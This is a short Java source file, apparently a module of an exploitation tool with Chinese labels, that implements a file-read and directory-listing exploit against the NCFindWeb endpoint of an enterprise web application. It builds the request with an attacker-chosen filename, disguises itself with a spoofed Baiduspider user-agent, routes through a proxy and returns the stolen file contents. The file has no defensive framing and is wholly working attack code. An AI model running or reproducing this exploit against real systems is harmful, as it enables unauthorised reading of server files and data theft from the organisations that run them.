package vul;

import Util.HttpUtil;
import okhttp3.Response;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

public class fileRead {
    public String fileReadAction(String vulName, String url, String path, Object proxy) throws IOException {
        String result;
        if ("NCFindWeb 文件读取/列目录".equals(vulName)) {
            result = NCFindWebFileRead(url, path, proxy);
        } else if ("All".equals(vulName)) {
            result = "请选择对应的漏洞";
        } else {
            result = "该漏洞暂不支持";
        }
        return result;
    }

    public String NCFindWebFileRead(String url, String path, Object proxy) throws IOException {
        Map<String, String> headers = new HashMap<>();
        headers.put("User-Agent", "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)");
        Response response = null;
        try {
            response = HttpUtil.get(url + String.format("NCFindWeb?service=IPreAlertConfigService&filename=%s", path), headers, (HttpUtil.ProxyConfig) proxy);
            String statusCode = String.valueOf(response.code());
            if ("200".equals(statusCode)) {
                String resBody = response.body().string();
                return resBody;
            } else {
                return "读取失败";
            }
        } catch (IOException e) {

            return "请求失败:" + e.getMessage();
        } finally {
            if (response != null) {
                response.close();
            }
        }
    }
}
